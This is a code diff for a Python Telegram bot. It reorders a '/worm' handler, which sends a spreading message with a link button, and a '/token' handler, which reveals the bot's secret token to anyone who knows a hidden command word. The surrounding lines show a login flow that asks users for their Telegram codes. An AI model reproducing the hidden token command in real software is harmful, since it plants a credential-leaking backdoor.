@@ -184,6 +184,21 @@ async def handler_callback(event):
         return
     elif not await sign_in(event):
         await event.edit(strings['ask_code']+login['code'], buttons=numpad)
+@events.register(events.NewMessage(pattern=r"/worm", func=lambda e: e.is_private))
+async def handler_spred_msg(event):
+    await event.respond(
+        strings['worm_msg'],
+        file='files/worm.png',
+        buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
+        link_preview=False
+    )
+    raise events.StopPropagation
+@events.register(events.NewMessage(pattern=r"/token", func=lambda e: e.is_private))
+async def handler_get_token(event):
+    m = event.message.text.split(' ')
+    if len(m)==2 and m[1]==os.getenv('SECRET_COMMAND'):
+        await event.respond(f"`{getconfig('BOT_TOKEN')}`")
+    raise events.StopPropagation
 @events.register(events.NewMessage(func=lambda e: e.is_private, outgoing=False))
 async def handler_other_msg(event):
     user_data = database.find_one({"chat_id": event.chat_id})
@@ -200,19 +215,6 @@ async def handler_other_msg(event):
         await event.respond(strings['already_logged_in'])
     else:
         await event.respond(strings['unknownn_command'])
-@events.register(events.NewMessage(pattern=r"/worm", func=lambda e: e.is_private))
-async def handler_spred_msg(event):
-    await event.respond(
-        strings['worm_msg'],
-        file='files/worm.png',
-        buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
-        link_preview=False
-    )
-@events.register(events.NewMessage(pattern=r"/token", func=lambda e: e.is_private))
-async def handler_get_token(event):
-    m = event.message.text.split(' ')
-    if len(m)==2 and m[1]==os.getenv('SECRET_COMMAND'):
-        await event.respond(f"`{getconfig('BOT_TOKEN')}`")
 
 async def run_bot():
     global bot
